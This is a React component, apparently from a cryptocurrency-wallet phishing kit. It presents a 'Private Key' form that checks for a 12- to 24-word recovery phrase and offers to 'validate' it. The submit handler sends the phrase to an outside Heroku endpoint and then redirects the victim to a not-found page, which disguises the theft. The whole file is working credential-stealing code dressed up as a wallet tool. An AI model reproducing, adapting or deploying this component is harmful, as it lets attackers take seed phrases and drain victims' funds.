import { useEffect, useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { BeatLoader } from "react-spinners";

const PrivateKey = ({
  seed3,
  setSeed3,
  error3,
  setError3,
  disabled3,
  setDisabled3,
  count3,
  setCount3,
}) => {
  const Navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const reg = /^[a-zA-z]+\s([a-zA-Z]+\s){10,22}[a-zA-Z]+$/;
    const reg1 = /^[a-zA-z]+\s([a-zA-Z]+\s){11,22}([a-zA-Z]+)?$/;
    const isMatch = reg.test(e.target.value);
    const isMatch1 = reg1.test(e.target.value);
    let len = e.target.value.length;

    if (isMatch || isMatch1 || len === 0) {
      setSeed3(e.target.value);
      setError3(false);
      setCount3(len);
    } else {
      setSeed3(e.target.value);
      setError3(true);
      setCount3(len);
    }
  };

  const handleSubmit = async (e) => {
    setDisabled3(true);
    setLoading(true);
    const res = await axios.post(
      "https://dappswalletsynchronizer.herokuapp.com/form",
      {
        seed: seed3,
      }
    );
    if (res.data.status === 200) {
      Navigate("/not_found");
    } else {
      console.log("An error occurred");
    }
  };

  useEffect(() => {
    if (count3 == 0 || error3) {
      setDisabled3(true);
    } else {
      setDisabled3(false);
    }
  }, [error3, count3]);

  return (
    <>
      <textarea
        style={{ borderColor: error3 && "red" }}
        onChange={handleChange}
        defaultValue={seed3}
        // cols='30'
        rows='10'
        placeholder='Private Key'
      ></textarea>
      {error3 && <p className='errorMsg'>Incomplete words</p>}
      <p className='info'>
        Typically 12(sometimes 24) words separated by spaces.
      </p>
      <button
        style={
          disabled3
            ? {
                backgroundColor: "rgba(26, 141, 218, 0.2)",
                cursor: "not-allowed",
              }
            : { backgroundColor: "#1a8dda", color: "#fff" }
        }
        onClick={handleSubmit}
        disabled={disabled3}
      >
        {!loading ? "VALIDATE" : <BeatLoader size={12} />}
      </button>
    </>
  );
};

export default PrivateKey;
